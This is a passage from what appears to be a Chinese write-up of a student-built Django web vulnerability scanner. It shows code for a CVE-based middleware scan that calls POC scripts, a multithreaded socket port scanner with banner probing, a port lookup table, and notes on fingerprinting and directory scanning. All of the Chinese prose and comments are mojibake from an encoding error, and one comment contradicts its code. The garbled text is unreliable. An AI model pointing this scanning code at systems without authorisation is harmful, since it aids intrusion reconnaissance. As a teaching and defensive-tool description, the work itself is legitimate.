#é€‰æ‹©çš„CVEç¼–å·\n}, function (data) {\n#å¤„ç†è¿”å›ç»“æœ\n      â€¦â€¦â€¦\n      â€¦â€¦â€¦}); \n}\n```\n\nå°†ç›®æ ‡æ·»åŠ åˆ°æ•°æ®åº“åï¼Œå†æŸ¥è¯¢æ•°æ®åº“å¼€å§‹æ‰«æï¼Œé€šè¿‡ ajax æ¥è®¿é—® start_Middleware_scan è°ƒç”¨å¼€å§‹æ‰«æçš„å‡½æ•°ï¼Œç”±äºæ‰«ææ—¶é—´å¯èƒ½ä¼šå¾ˆé•¿ï¼Œéœ€è¦è®¾ç½®è¶³å¤Ÿçš„ timeout æ¥ç­‰å¾…æ‰«æçš„ç»“æœè¿”å›ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```javascript\n$.ajax({\n#ä½¿ç”¨POSTè¯·æ±‚å‘é€ç›®æ ‡URLå’ŒCVEç¼–å·ï¼Œè®¾ç½®è¶…æ—¶ä¸º1ç§’\n    type: \"POST\",\n    url: '/start_Middleware_scan',\n    timeout: 10000,\n    data: {\n    ip: ip,\n    CVE_id: CVE_id\n    }\n});\n```\n\nåœ¨ **urls.py** é‡ŒåŠ å…¥ä¸­é—´ä»¶æ¼æ´æ‰«æçš„è®¿é—®è·¯å¾„ï¼Œéœ€è¦åŠ å…¥ä¸¤ä¸ªè·¯å¾„ï¼š`â€™Middleware_scanâ€˜`ï¼Œ`â€˜start_Middleware_scanâ€™`ã€‚å‰è€…æ˜¯ç”¨æˆ·æ·»åŠ æ‰«æç›®æ ‡æ—¶çš„è·¯å¾„ï¼Œç”¨äºæ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ç›®æ ‡å’ŒCVEç¼–å·ä¹‹åå°†å…¶æ’å…¥æ•°æ®åº“ã€‚åè€…æ˜¯å°†ç›®æ ‡æ’å…¥æ•°æ®åº“ä¹‹åï¼Œé€šè¿‡æ—¶é—´æˆ³ã€çŠ¶æ€ã€ç›®æ ‡ URL ä»¥åŠ CVE ç¼–å·æŸ¥è¯¢å‡ºæ¥å¼€å§‹æ‰«æã€‚å½“æ‰«æç»“æŸæ—¶æ›´æ–°æ•°æ®åº“ä¸­å¯¹åº”æ‰«æç›®æ ‡çš„çŠ¶æ€ã€‚è¿™æ ·çš„è®¾è®¡å¯ä»¥å®æ—¶çš„çœ‹åˆ°æ‰«æçš„çŠ¶æ€ã€‚\n\næ•°æ®åº“ä½¿ç”¨çš„æ˜¯ Sqliteï¼Œåœ¨ **models.py** é‡Œåˆ›å»ºä¸€ä¸ªæ•°æ®åº“è¡¨ Middleware_vuln ï¼Œå­—æ®µåŒ…æ‹¬IDã€ç›®æ ‡URLã€çŠ¶æ€ã€ç»“æœã€CVEç¼–å·ã€æ—¶é—´æˆ³ã€‚åœ¨ Django é‡Œå®šä¹‰è¿™ä¸ªç±»è¡¨ç¤ºæˆ‘ä»¬éœ€è¦åˆ›å»ºçš„æ•°æ®åº“ï¼Œåœ¨ modles.py é‡Œåˆ›å»ºå¥½ä¹‹åï¼Œä½¿ç”¨å‘½ä»¤`python manage.py makemigrations`æ¥è®°å½• modles.py çš„æ‰€æœ‰æ”¹åŠ¨ï¼Œå¹¶ä¸”å°†è¿™ä¸ªæ”¹åŠ¨è¿ç§»åˆ° migrations è¿™ä¸ªæ–‡ä»¶ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ä¾‹å¦‚ï¼š0001æ–‡ä»¶ï¼Œå¦‚æœä½ æ¥ä¸‹æ¥è¿˜è¦è¿›è¡Œæ”¹åŠ¨çš„è¯å¯èƒ½ç”Ÿæˆå°±æ˜¯å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸ä¸€å®šéƒ½æ˜¯0001æ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤å¹¶æ²¡æœ‰ä½œç”¨åˆ°æ•°æ®åº“ï¼Œå†ä½¿ç”¨å‘½ä»¤ `python manage.py migrate` å°†æ ¹æ®åˆšåˆšæ£€æµ‹åˆ°çš„æ”¹åŠ¨æ¥åˆ›å»ºæ•°æ®åº“è¡¨å’Œå­—æ®µå±æ€§ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\nclass Middleware_vuln(models.Model):\n#ç±»åä¸ºæ•°æ®åº“è¡¨åï¼Œå˜é‡åä¸ºå­—æ®µåï¼Œå­—æ®µå±æ€§å®šä¹‰å¦‚ä¸‹\n\tid = models.AutoField(primary_key=True)\n\turl = models.CharField(max_length=100, null=True)\n\tstatus = models.CharField(max_length=20, null=True)\n\tresult = models.CharField(max_length=100, null=True)\n\tCVE_id = models.CharField(max_length=100, null=True)\n\ttime = models.CharField(max_length=100, null=True, unique=True)\n\n```\n\nåœ¨æ·»åŠ ç›®æ ‡å’Œå¼€å§‹æ£€æµ‹çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æ’å…¥æ•°æ®åº“å’ŒæŸ¥è¯¢æ•°æ®åº“ï¼Œè¿™é‡Œä½¿ç”¨ Django çš„å‡½æ•°æ¥å¤„ç†æ•°æ®åº“çš„å¢åˆ æŸ¥æ”¹ã€‚å¯¹äº Middleware_vule çš„æ’å…¥ä½¿ç”¨ `Middleware_vuln.objects.create(url, status, result, CVE_id, time)`ï¼Œæ›´æ–°ä½¿ç”¨ `Middleware_vuln.objects.filter(time).update(status, result)`ã€‚è¿˜éœ€è¦ä½¿ç”¨ try-except æ¥å¤„ç†å¼‚å¸¸æƒ…å†µå¹¶æ‰“å°å‡ºé”™ä¿¡æ¯ã€‚\n\n```python\ndef insert_Middleware_data(url, CVE_id, Time, result=None, status=\"runing\"):\n    try:\n        Middleware_vuln.objects.create(url=url, status=status, result=result, CVE_id=CVE_id, time=Time)\n        print(\"insert success\")\n        return True\n    except:\n        print(\"data insert error\")\n        return False\n\n\ndef update_Middleware_data(url, CVE_id, Time, result):\n    try:\n        Middleware_vuln.objects.filter(url=url, status='runing', CVE_id=CVE_id, time=Time).update(status=\"completed\", result=result)\n        print(\"update success\")\n    except:\n        print(\"data updata error\")\n```\n\n åœ¨**views.py**é‡Œå®šä¹‰ `Middleware_scan()` è·å–ç”¨æˆ·è¾“å…¥ï¼Œå¹¶æ’å…¥åˆ°æ•°æ®åº“ä¸­,å…¶ä¸­æ—¶é—´æˆ³ Time ä¸ºå…¨å±€å˜é‡ï¼Œä½œä¸ºåé¢å¼€å§‹æ‰«æéƒ¨åˆ†æŸ¥è¯¢æ•°æ®åº“çš„æ¡ä»¶ï¼Œåœ¨æ’å…¥æ•°æ®æˆåŠŸå°±è¿”å› success(),å¦ä¾§è¿”å› error()ï¼Œè¿™é‡Œè¿”å›çš„å‡½æ•°æ—¶è¿”å›çš„çŠ¶æ€ç ï¼Œsuccess()è¿”å›çš„æ˜¯200ï¼Œerror()è¿”å›404ï¼Œé€šè¿‡ä¸Šé¢ JavaScrip tæ¥æ”¶ååšå‡ºåˆ¤æ–­ï¼Œå¹¶å¼¹å‡ºç›¸åº”çš„æç¤ºæ¡†ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\nTime = 0.0\n@csrf_exempt\n@login_required\ndef Middleware_scan(request):\n    #ä½¿ç”¨POSTè¯·æ±‚è·å–ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶æ’å…¥æ•°æ®åº“ä¸­ã€‚\n    #Timeä½œä¸ºå…¨å±€å˜é‡æ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä½œä¸ºæŸ¥è¯¢ç›®æ ‡ä¿¡æ¯çš„æ¡ä»¶ã€‚\n    global Time\n    try:\n        url= request.POST.get('ip')\n        CVE_id = request.POST.get('CVE_id').replace('-',\"_\")\n        Time = time.time()  # time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime(t))æ—¶é—´æˆ³è½¬æ—¥æœŸæ ¼å¼\n        if insert_Middleware_data(url, CVE_id, Time):\n            return success()\n    except:\n        return error()\n```\n\nåˆå®šä¹‰å‡½æ•° `start_Middleware_scan()`,å®ç°å°†æ•°æ®åº“ä¸­æ—¶é—´æˆ³ä¸º Timeï¼ŒçŠ¶æ€ä¸º run çš„ç›®æ ‡æŸ¥è¯¢å‡ºæ¥ï¼Œæ ¹æ® CVEç¼–å·è°ƒç”¨å¯¹åº”çš„ POC è„šæœ¬ã€‚æœ€åæ›´æ–°æ•°æ®åº“çš„æ‰«æç»“æœå’Œæ‰«æçŠ¶æ€ï¼Œç”±äºåœ¨ä¸Šä¸€æ­¥ä¸­å°†æ•°æ®æ’å…¥æ•°æ®åº“ä¸­å¯èƒ½ä¼šèŠ±è´¹ä¸€ç‚¹æ—¶é—´ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ sleep() ç­‰å¾…æ•°æ®æ’å…¥åå†è¿›è¡ŒæŸ¥è¯¢å·¥ä½œå’Œæ‰«æå·¥ä½œï¼Œä¿è¯ä¸é—æ¼æ‰«æç›®æ ‡ã€‚\n\n```python\n@csrf_exempt\n@login_required\ndef start_Middleware_scan(request):\n    try:\n        url = request.POST.get('ip')\n        ip, port = urlparse(url).netloc.split(':')\n        CVE_id = request.POST.get('CVE_id').replace('-', \"_\")\n        time.sleep(5) #ç­‰å¾…æ•°æ®æ’å…¥æˆåŠŸååœ¨æŸ¥è¯¢å‡ºæ¥æ‰«æ\n        msg = Middleware_vuln.objects.filter(url=url, status='runing', CVE_id=CVE_id, time=Time)\n        print(msg)\n        #æ‰«ææ¡ç›®å¯èƒ½ä¸æ­¢ä¸€æ¡ï¼Œéœ€è¦ä½¿ç”¨å¾ªç¯æ¥æ‰«æ\n        for target in msg:\n            result = POC_Check(target.url, target.CVE_id)\n            #å°†æ‰«æç»“æœå’ŒçŠ¶æ€æ›´æ–°\n            update_Middleware_data(target.url, target.CVE_id, Time, result)\n        return success()\n    except:\n        return error()\n```\n\n##  ç«¯å£æ‰«æ\n\n> æœ¬ç³»ç»Ÿç«¯å£æ‰«æå½“ç”¨æˆ·æŒ‡å®šäº†ç›®æ ‡IPåœ°å€åï¼Œç³»ç»Ÿæ­£å¼å·¥ä½œï¼ŒIPä¼ å…¥åå°å¯¹ç›®æ ‡è¿›è¡Œæ‰«æï¼Œæ‰«æå®Œæˆåå°†å¼€æ”¾ç«¯å£å’Œå¯¹åº”æœåŠ¡æ˜¾ç¤ºåˆ°å‰ç«¯ç•Œé¢ä¸Šã€‚åœ¨â€œæŒ‰ç«¯å£åˆ†å¸ƒåˆ’åˆ†â€å’Œâ€œæŒ‰åè®®ç±»å‹åˆ’åˆ†â€ä¸¤ä¸ªæ ç›®ä¸­å¯¹ç«¯å£åˆ’åˆ†è¿›è¡Œè®²è§£ï¼Œä½¿ç”¨æˆ·å…äºæŸ¥è¯¢çš„ç¹çã€‚åŒæ—¶è¯¥æ¨¡å—è¿˜å°†å†…ç½®å¸¸è§ç«¯å£æŸ¥è¯¢è¡¨ï¼Œåœ¨æ­¤å¯è¿›è¡Œç«¯å£åŠå…¶å¯¹åº”æœåŠ¡å’ŒåŠŸèƒ½çš„ç›¸å…³æŸ¥è¯¢å’Œç­›é€‰ï¼Œé€šè¿‡è¿™ä¸€ç³»åˆ—åŠŸèƒ½ç”¨æˆ·èƒ½å¤Ÿæ›´åŠ æ¸…æ™°çš„è®¤è¯†åˆ°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†å“ªäº›æœåŠ¡ï¼Œä»¥æ­¤æ¥åˆ†æå¯èƒ½å­˜åœ¨æ¼æ´çš„æœåŠ¡ã€‚\n\n### è®¾è®¡æ€è·¯\n\næœ¬ç³»ç»Ÿç«¯å£æ‰«æçš„å®ç°æ–¹æ³•æ˜¯åˆ©ç”¨Pythonæä¾›çš„åº“å‡½æ•°Socketè¿›è¡Œè°ƒç”¨ï¼Œé€šè¿‡TCPä¸‰æ¬¡æ¡æ‰‹ä¸ç›®æ ‡è®¡ç®—æœºçš„ç«¯å£å»ºç«‹è¿æ¥ã€‚å½“å®Œæˆä¸€æ¬¡å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹æ—¶ï¼Œåˆ™å¯ä»¥æ¨æ–­å‡ºç«¯å£å’Œå¯¹åº”æœåŠ¡æ˜¯å¼€æ”¾çš„ï¼Œåä¹‹åˆ™æ²¡æœ‰å¼€æ”¾ï¼Œä¸ºäº†æé«˜äº†æ‰«æçš„æ•ˆç‡ï¼Œæœ¬ç³»ç»Ÿå¼•å…¥å¤šçº¿ç¨‹æ‰«ææœºåˆ¶ã€‚\n\n### å®ç°æ•ˆæœ\n\n![ç«¯å£æ‰«æ](https://img.jwt1399.top//img/20210619183819.png)\n\n### è¯¦ç»†å®ç°\n\n#### ç«¯å£æ‰«æ\n\né€šè¿‡ Python ç›´æ¥å®šä¹‰ socketï¼Œå°è¯•ä¸ç›®æ ‡ç«¯å£è¿›è¡Œè¿æ¥ã€‚æœ¬ç¨‹åºä¸­ä½¿ç”¨`sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM);`çš„æ–¹å¼è¿›è¡Œ TCP è¿æ¥ï¼Œè°ƒç”¨`sock.connect_ex((ip,port))`ï¼Œæ¥å°è¯•è¿æ¥ç«¯å£ï¼Œå¦‚æœç«¯å£å¼€æ”¾åˆ™è¿”å›0ï¼Œå¦åˆ™è¿”å›é”™è¯¯ä»£ç ã€‚ä½¿ç”¨tryè¯­å¥æ¥æ•è·å¼‚å¸¸ï¼Œå¦‚æœ socket è¿æ¥è¶…æ—¶ï¼Œåˆ™è¿”å›å¼‚å¸¸å¤„ç†ä¿¡æ¯ã€‚æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\n\n```python\ndef socket_scan(self, hosts):\n    '''ç«¯å£æ‰«ææ ¸å¿ƒä»£ç '''\n    global PROBE\n    socket.setdefaulttimeout(1)\n    ip, port = hosts.split(':')\n    try:\n        if len(self.port) < 25:\n            # åˆ›å»ºå¥—æ¥å­—\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            # TCP/IPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥\n            result = sock.connect_ex((ip, int(port)))   \n# è°ƒç”¨socket.connect_ex((ip, port))ï¼Œç«¯å£å¼€æ”¾è¿”å›0ï¼Œå¦åˆ™è¿”å›é”™è¯¯ä»£ç \n# å®ç°å’Œnmapçš„å…¨è¿æ¥æ‰«æç±»ä¼¼çš„åŠŸèƒ½ã€‚\n            if result == 0:                     # æˆåŠŸå»ºç«‹TCPé“¾æ¥\n                self.port.append(port)          # ç»“æœé›†ä¸­å¢åŠ ç«¯å£\n                for i in PROBE:                 # é€šè¿‡HTTP1.1åˆºæ¢\n                    sock.sendall(i.encode())    # å‘é€å®Œæ•´çš„TCPæ•°æ®åŒ…\n                    response = sock.recv(256)   # æ¥å—æœ€å¤§256byte\n                    sock.close()\n                    if response:\n                        break\n                if response:\n                    for pattern in SIGNS:\n                        pattern = pattern.split(b'|')\n                        if re.search(pattern[-1],response, re.IGNORECASE): \n# æ­£åˆ™åŒ¹é…bannerä¿¡æ¯ä¸å­—å…¸ä¸­çš„æœåŠ¡\n                            proto = '{}:{}'.format(pattern[1].decode(), port)\n                            self.out.append(proto)  # æ·»åŠ è‡³è¾“å‡ºç»“æœ\n                            break\n        else:\n            self.num = 1\n    except (socket.timeout, ConnectionResetError): # å¼‚å¸¸å¤„ç†\n        pass\n    except:\n        pass\n\n```\n\nå¦‚æœè¿™æ ·å•çº¿ç¨‹ï¼ˆä¸²è¡Œï¼‰é˜»å¡è¿è¡Œï¼Œä¼šè€—è´¹å¤§é‡æ—¶é—´ï¼Œå› æ­¤ï¼Œé€šè¿‡å¹¶å‘çš„æ–¹å¼ï¼Œå¹¶å‘è¯·æ±‚ï¼Œæå‡æ‰«æé€Ÿåº¦ï¼Œé€šè¿‡å¯¹æ¯”æ‰«æ300ä¸ªç«¯å£å•çº¿ç¨‹éœ€è¦30så·¦å³ï¼Œå¤šçº¿ç¨‹ä»…éœ€10så·¦å³ã€‚\n\næœ¬ç«¯å£æ‰«æåŠŸèƒ½ä¸­é‡‡ç”¨äº†å¹¶å‘64æ¡çº¿ç¨‹æ¥è¿›è¡Œæ‰«æï¼Œå› æ­¤ï¼Œåœ¨å®šä¹‰runæ–¹æ³•æ—¶ï¼Œæ¯ä¸ªçº¿ç¨‹æ‰«æçš„ä¸¤ä¸ªç«¯å£å·é—´å·®æ•°ä¸º64ï¼Œåœ¨ç¨‹åºä¸­ä½¿ç”¨ concurrent.futures æ¥å®ç°ã€‚concurrent.futures æ¨¡å—æä¾›äº†ä¸€ä¸ªé«˜æ°´å¹³çš„æ¥å£ç”¨äºå¼‚æ­¥æ‰§è¡Œè°ƒç”¨ã€‚å¼‚æ­¥æ‰§è¡Œå¯ä»¥ä½¿ç”¨çº¿ç¨‹å®ç°ï¼Œä½¿ç”¨ ThreadPoolExecutorï¼Œæˆ–è€…ç‹¬ç«‹çš„è¿›ç¨‹ï¼Œä½¿ç”¨ ProcessPoolExecutor å®ç°ã€‚ä¸¤è€…éƒ½å®ç°ç›¸åŒæ¥å£ï¼Œéƒ½æ˜¯ç”±æŠ½è±¡ Executor ç±»å®šä¹‰çš„ã€‚\n\n```python\nTHREADNUM = 64  # çº¿ç¨‹æ•°\ndef run(self, ip):  #å¤šçº¿ç¨‹æ‰«æ\n    hosts = []\n    global PORTS, THREADNUM\n    for i in PORTS:\n        hosts.append('{}:{}'.format(ip, i))\n    try:\n        with concurrent.futures.ThreadPoolExecutor(\n                max_workers=THREADNUM) as executor:\n            executor.map(self.socket_scan, hosts)\n    except EOFError:\n        pass\n```\n\n#### ç«¯å£æŸ¥è¯¢è¡¨\n\nç«¯å£æŸ¥è¯¢è¡¨åŠŸèƒ½é€šè¿‡æ”¶é›†ç½‘ä¸Šç«¯å£ä¿¡æ¯å»ºç«‹ç«¯å£æŸ¥è¯¢åº“ï¼Œæ¶‰åŠåˆ°çš„ç«¯å£æ•°æ®æ˜¯å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼ŒåŒ…æ‹¬ç«¯å£IDã€ç«¯å£å·ã€ç«¯å£å¯¹åº”æœåŠ¡ã€ç«¯å£å¯¹åº”åè®®å’Œç«¯å£æ‰€å±çŠ¶æ€ã€‚ç«¯å£æŸ¥è¯¢è¡¨ç»“æ„å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚\n\n| å­—æ®µå   | å­—æ®µç±»å‹    | å…è®¸ç©º    | æ˜¯å¦ä¸»é”® | å¤‡æ³¨         |\n| -------- | ----------- | --------- | -------- | ------------ |\n| id       | integer     | Not  null | True     | ç«¯å£ID       |\n| num      | bigint      | Not  null | False    | ç«¯å£å·       |\n| service  | text        | Not  null | False    | ç«¯å£å¯¹åº”æœåŠ¡ |\n| protocol | Varchar(20) | Not  null | False    | ç«¯å£å¯¹åº”åè®® |\n| status   | Varchar(10) | Not  null | False    | ç«¯å£æ‰€å±çŠ¶æ€ |\n\nç«¯å£æŸ¥è¯¢æ•°æ®åº“é‡‡ç”¨Django Modelè¿›è¡Œå»ºç«‹ï¼Œå­—æ®µåŒ…å«ç«¯å£å·ã€æœåŠ¡ã€åè®®ã€å’ŒçŠ¶æ€ã€‚å®ç°ä»£ç å¦‚ä¸‹ï¼š\n\n```python\nclass PortList(models.Model):\n    '''ç«¯å£æŸ¥è¯¢è¡¨'''\n    num=models.BigIntegerField(verbose_name='ç«¯å£å·')\n    service=models.TextField(max_length=100,verbose_name='æœåŠ¡')\n    protocol=models.CharField(max_length=20,verbose_name='\nåè®®',blank=True,default='æœªçŸ¥')\n    status=models.CharField(max_length=10,verbose_name='\nçŠ¶æ€',blank=True,default='æœªçŸ¥')\n    class Meta:  \n\t# åå°è¡¨å¤´è®¾ç½®\n        verbose_name=verbose_name_plural='ç«¯å£åˆ—è¡¨'\n```\n\næ•°æ®åº“å»ºç«‹åéœ€è¦è¿›è¡Œåå°æ³¨å†Œï¼Œè¿™æ ·å¯ä»¥è¿›å…¥åå°å¯¹æ•°æ®è¿›è¡Œç®¡ç†ï¼Œå®ç°ä»£ç å¦‚ä¸‹ï¼š\n\n```python\n@admin.register(PortList)\nclass PortListAdmin(ImportExportModelAdmin):\n    # è®¾ç½®å“ªäº›å­—æ®µæ˜¾ç¤ºåœ¨åå°\n    list_display = ('num', 'service', 'protocol', 'status',)\n    # è®¾ç½®numå­—æ®µè¿›å…¥ç¼–è¾‘ç•Œé¢ \n    list_display_links = ('num',)  \n    search_fields = ('num', 'service',)\n    # è¿‡æ»¤å™¨ï¼ŒæŒ‰å­—æ®µè¿›è¡Œç­›é€‰\n    list_filter = ('protocol','status')\n    # è®¾ç½®numä¸ºé»˜è®¤æ’åºå­—æ®µ\n    ordering = ('num', )\n    list_per_page = 15  #è®¾ç½®æ¯é¡µæ˜¾ç¤ºæ•°æ®æ¡æ•°\n```\n\n\n\n## æŒ‡çº¹è¯†åˆ«\n\n> è¯¥æ¨¡å—é‡‡ç”¨æå–æŒ‡çº¹ç‰¹å¾ç ç‰¹å¾ä¿¡æ¯æ¥è¯†åˆ«WebæŒ‡çº¹ï¼Œç³»ç»Ÿé€šè¿‡æ„é€ å¤§é‡ç‰¹æ®Šçš„HTTPè¯·æ±‚ä¸WebæœåŠ¡å™¨äº¤äº’ï¼Œä»å…¶å“åº”æ•°æ®åŒ…ä¿¡æ¯ä¸­æå–æå–æŒ‡çº¹ç‰¹å¾ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ä¸æŒ‡çº¹æ•°æ®åº“è¿›è¡Œæ¯”å¯¹ï¼Œä»è€Œè·å–åˆ°WebæœåŠ¡å™¨åŠåº”ç”¨çš„ç»„ä»¶ä¿¡æ¯å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚é€šè¿‡å‘ç°è¿™äº›ç‰¹å¾ä¿¡æ¯å¹¶å¯¹å®ƒè¿›è¡Œè¯†åˆ«å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿåœ°åˆ¶å®šæ¸—é€ç­–ç•¥ï¼Œæ˜¯æ¸—é€ç¯èŠ‚ä¸­å…³é”®çš„ä¸€æ­¥ã€‚\n\n### è®¾è®¡æ€è·¯\n\nå›½å†…å¤–å¯¹WebæœåŠ¡å™¨åŠåº”ç”¨æŒ‡çº¹çš„ç ”ç©¶ï¼Œä¸»è¦éƒ½æ˜¯é€šè¿‡æ„é€ å¤§é‡ç‰¹æ®Šçš„HTTPè¯·æ±‚ä¸WebæœåŠ¡å™¨äº¤äº’ï¼Œä»å…¶å“åº”æ•°æ®åŒ…ä¿¡æ¯ä¸­æå–æå–æŒ‡çº¹ç‰¹å¾ä¿¡æ¯ï¼Œç„¶åé€šè¿‡ä¸æŒ‡çº¹æ•°æ®åº“è¿›è¡Œæ¯”å¯¹ï¼Œä»è€Œè·å–åˆ°WebæœåŠ¡å™¨åŠåº”ç”¨çš„ç»„ä»¶ä¿¡æ¯å’Œç‰ˆæœ¬ä¿¡æ¯ã€‚æœ¬æ–‡é‡‡ç”¨åŸºäºå…³é”®å­—ç‰¹å¾åŒ¹é…çš„æ–¹æ³•å®ç°æŒ‡çº¹è¯†åˆ«åŠŸèƒ½ï¼Œä¸ºäº†ä½¿æ£€æµ‹ç»“æœæ›´åŠ å‡†ç¡®ï¼Œå¯¹æ¯”ç½‘ä¸Šä¸€äº›ä¸»æµçš„æŒ‡çº¹æ•°æ®åº“ï¼Œå¯¹æœ¬ç³»ç»Ÿçš„æ•°æ®åº“è¿›è¡Œäº†ä¸€ç³»åˆ—ä¼˜åŒ–ã€‚\n\n### å®ç°æ•ˆæœ\n\n![finger](../images/æ¯•è®¾è¿›ç¨‹/finger.png)\n\n### è¯¦ç»†å®ç°\n\næŒ‡çº¹è¯†åˆ«æµç¨‹ä¸­æœ€å…³é”®çš„å°±æ˜¯æå–æŒ‡çº¹ç‰¹å¾è¿™ä¸€æ­¥éª¤ã€‚æå–æŒ‡çº¹ç‰¹å¾é¦–å…ˆéœ€è¦ç¡®å®šåº”è¯¥æå–å“åº”æ•°æ®æŠ¥æ–‡ä¸­çš„å“ªäº›æ•°æ®ã€‚å› æ­¤éœ€è¦è®¾è®¡ç‰¹å¾æå–ç®—æ³•å¯¹å“åº”æ•°æ®æŠ¥æ–‡è¿›è¡Œåˆ†æï¼Œå“åº”æ•°æ®åŒ…æ˜¯ç”±å“åº”è¡Œã€å“åº”å¤´ã€å“åº”ä½“ä¸‰éƒ¨åˆ†æ„æˆã€‚å“åº”è¡Œç”±HTTPç‰ˆæœ¬ã€çŠ¶æ€ç ã€çŠ¶æ€ç æè¿°æ„æˆã€‚å“åº”å¤´ç”¨äºæŒ‡ç¤ºå®¢æˆ·ç«¯å¦‚ä½•å¤„ç†å“åº”ä½“ï¼Œå“åº”å¤´é‡Œé¢åŒ…å«å¾ˆå¤šçš„ç»„ä»¶ä¿¡æ¯ï¼Œç”¨äºå‘Šè¯‰æµè§ˆå™¨å“åº”çš„ç±»å‹ã€å­—ç¬¦ç¼–ç æœåŠ¡å™¨ç±»å‹å’Œå­—èŠ‚å¤§å°ç­‰ä¿¡æ¯ã€‚å“åº”ä½“åˆ™æ˜¯æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚è¿”å›ç»™å®¢æˆ·ç«¯çš„å…·ä½“æ•°æ®ã€‚å“åº”å¤´å’Œå“åº”ä½“ä¸­åŒ…å«äº†èƒ½å¤Ÿè¯†åˆ«WebæŒ‡çº¹ç»„ä»¶çš„å­—æ®µå†…å®¹ï¼Œå› æ­¤ï¼Œå¯¹å“åº”å¤´å’Œå“åº”ä½“ä¸­å…³é”®å­—æ®µçš„æå–ï¼Œæ˜¯å®ç°æŒ‡çº¹è¯†åˆ«æŠ€æœ¯çš„æ ¸å¿ƒã€‚\n\næŒ‡çº¹è¯†åˆ«æŠ€æœ¯åˆ†ä¸ºä¿¡æ¯æ”¶é›†é˜¶æ®µå’ŒWebæŒ‡çº¹è¯†åˆ«é˜¶æ®µã€‚\n\n(I)ä¿¡æ¯æ”¶é›†é˜¶æ®µ:é€šè¿‡ç”¨æˆ·è¾“å…¥çš„URLï¼Œæ”¶é›†Webåº”ç”¨çš„ç‰¹å®šå­—æ®µä¿¡æ¯ï¼Œè¿”å›é¡µé¢å…³é”®å­—æˆ–è€…ç‰¹æ®Šæ–‡ä»¶å’Œè·¯å¾„ç­‰è¿™äº›ç‰¹å¾ã€‚æ”¶é›†çš„å…³é”®æ•°æ®è¶Šå¤šå¯¹æ¥ä¸‹æ¥çš„æŒ‡çº¹è¯†åˆ«ç»“æœè¶Šå‡†ç¡®ã€‚\n\n(2)WebæŒ‡çº¹è¯†åˆ«é˜¶æ®µ:è¯¥é˜¶æ®µåŒ…å«ä¸¤éƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†æ˜¯æŒ‡çº¹åº“çš„å»ºç«‹ï¼Œè¯¥éƒ¨åˆ†ä¸»è¦è´Ÿè´£ä»å·²çŸ¥çš„Webåº”ç”¨ç¨‹åºä¸­æ”¶é›†ç‰¹å¾ä¿¡æ¯ï¼Œå¹¶ä¸”å»ºç«‹æŒ‡çº¹ç‰¹å¾åº“ï¼›æœ¬æ–‡é€šè¿‡åˆ†æHTTPå“åº”æ•°æ®æŠ¥æ–‡ï¼Œè®¾è®¡äº†ç½‘ç«™æŒ‡çº¹çš„æå–è§„åˆ™ï¼Œé€šè¿‡åˆ†æå“åº”å¤´å­—æ®µå’Œå“åº”ä½“å†…å®¹æ„å»ºäº†ä¸€ä¸ªæŒ‡çº¹ç»„ä»¶ä¿¡æ¯åº“ï¼Œä¿¡æ¯åº“é‡‡ç”¨JSONæ ¼å¼è¿›è¡Œå­˜å‚¨ã€‚æŒ‡çº¹ä¿¡æ¯æ˜¯ä»Wappalyzerå’ŒFOFAç­‰å¹³å°ä¸Šè¿›è¡Œæ”¶é›†å½’çº³çš„ã€‚å¦ä¸€éƒ¨åˆ†ä»å¾…æµ‹çš„Webåº”ç”¨ç¨‹åºä¸­æ”¶é›†ç‰¹å¾ä¿¡æ¯ï¼Œå¹¶ä¸æŒ‡çº¹ç‰¹å¾åº“ä¸­çš„æ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œè¯†åˆ«å‡ºå¾…æµ‹çš„webåº”ç”¨ç¨‹åºã€‚\n\n## ç›®å½•æ‰«æ\n\n> ç›®å½•è¯†åˆ«å‚ç…§dirsearchå®ç°ï¼ŒåŒ…å«phpã€aspã€jspç­‰ç½‘ç«™ç±»å‹è¿›è¡Œæ‰«æï¼Œè¿˜è®¾ç½®äº†é€’å½’æ‰«æå’Œè‡ªå®šä¹‰æ‰«æé€‰é¡¹ã€‚æ”¯æŒè‡ªå®šä¹‰å‰åç¼€æˆ–è€…å­ç›®å½•ã€‚\n\n### è®¾è®¡æ€è·¯\n\nDirsearch æ‰«æçš„ç»“æœé€šè¿‡ JSONçš„æ ¼å¼ä¿å­˜åœ¨å¯¹åº”çš„è·¯å¾„ä¸‹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è½»å¯¹æ•°æ®åº“çš„ä¾èµ–ã€‚è·å–çš„æ•°æ®è¢«åˆ†æˆ URL å’Œ TIMRï¼ŒURLä¸‹åˆåˆ†ä¸º content-lengthã€pathã€redirectã€staruså››ä¸ªéƒ¨åˆ†ã€‚å› ä¸ºåœ¨ JSON æ ¼å¼ä¸­è¢«ä¸åŒç±»å‹æ‹¬å·çš„æ•°æ®ä¼šè¢« Django è§£æä¸ºåˆ—è¡¨ã€å­—å…¸ç­‰æ ¼å¼ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹è·å¾—çš„ JSON 